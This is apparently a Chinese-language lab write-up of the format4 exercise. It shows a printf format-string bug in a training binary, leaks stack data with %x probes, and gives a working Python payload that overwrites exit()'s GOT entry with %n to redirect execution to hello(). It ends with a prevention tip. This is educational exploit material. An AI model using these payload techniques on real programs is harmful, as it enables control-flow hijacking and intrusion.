# <center>格式化字符串实验3</center>

## 实验概述

### 【目的】
运行format4，得到输出`code execution redirected! you win`
### 【环境】
Linux
### 【工具】
python
### 【原理】
格式化字符串，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。[1]
## 实验步骤

### 【步骤】
#### format4
```
void __noreturn vuln()
{
  char s; // [sp+0h] [bp-208h]@1

  fgets(&s, 512, stdin);
  printf(&s);
  exit(1);
}
```
```
void __noreturn hello()
{
  puts("code execution redirected! you win");
  _exit(1);
}
.text:080484EB hello           proc near
.text:080484EB                 push    ebp
.text:080484EC                 mov     ebp, esp
.text:080484EE                 sub     esp, 8
.text:080484F1                 sub     esp, 0Ch
.text:080484F4                 push    offset s        ; "code execution redirected! you win"
.text:080484F9                 call    _puts
.text:080484FE                 add     esp, 10h
.text:08048501                 sub     esp, 0Ch
.text:08048504                 push    1               ; status
.text:08048506                 call    __exit
.text:08048506 hello           endp
```
需要控制程序执行流到`hello()`函数，`printf()`后紧跟着`exit()`,这里要更改执行流到`hello()`，需要覆盖`exit()`got表地址。
```
.got.plt:0804A01C off_804A010     dd offset _exit         ; DATA XREF: __exitr
```
通过IDA pro可以看到，我们需要把0804a01c的值改为080484eb
```
$ python -c 'print "AAAA"+".".join(["%d:%%x" % i for i in range(1,16)])' | ./format4
AAAA1:200.2:f7ed25a0.3:f7f0cf8a.4:41414141.5:78253a31.6:253a322e.7:3a332e78.8:342e7825.9:2e78253a.10:78253a35.11:253a362e.12:3a372e78.13:382e7825.14:2e78253a.15:78253a39

$ python -c 'print "ABCD" + "X" * 4 + "%4$x."' | ./format4
ABCDXXXX44434241.

```
查到偏移为4。
```
$ python -c 'print "\x1c\xa0\x04\x08\x1d\xa0\x04\x08\x1e\xa0\x04\x08\x1f\xa0\x04\x08"  + "%219d%4$n%153d%5$n%128d%6$n%260d%7$n"' | ./format4
����                                                                                                                                                                                                                        512                                                                                                                                               -135318112                                                                                                                      -135078006                                                                                                                                                                                                                                                           134520860
code execution redirected! you win

```

### 【总结】

本次实验主要进一步熟悉了通过%x泄露内存数据，通过%n来进行任意地址写，通过%`x`d来控制输出x个字符，通过覆写got表地址来达到控制程序执行流的目的。

可以发现，格式化字符串漏洞发生的原因是程序将格式化字符串的权限交给用户，即用户可以操作格式化字符串的内容。

要预防这类情况，在使用格式化字符串函数时，format参数的权限一定不能交给用户。
